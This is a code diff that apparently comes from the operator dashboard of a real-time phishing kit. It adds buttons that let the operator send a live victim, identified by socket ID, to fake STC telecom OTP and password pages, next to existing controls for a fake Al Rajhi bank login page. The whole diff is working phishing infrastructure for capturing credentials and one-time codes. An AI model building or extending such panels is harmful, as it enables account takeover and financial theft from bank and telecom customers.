@@ -1280,6 +1280,14 @@
             });
             html += '</div>';
             
+            // إضافة أزرار لتوثيق رقم الجوال
+            if (dataEntry.page === 'توثيق رقم الجوال') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'mystc-otp\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'stc-password\')" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
+              html += '</div>';
+            }
+            
             // إضافة أزرار للراجحي تسجيل الدخول
             if (dataEntry.page === 'تسجيل الدخول الراجحى') {
               html += '<div class="flex gap-2 mt-3">';
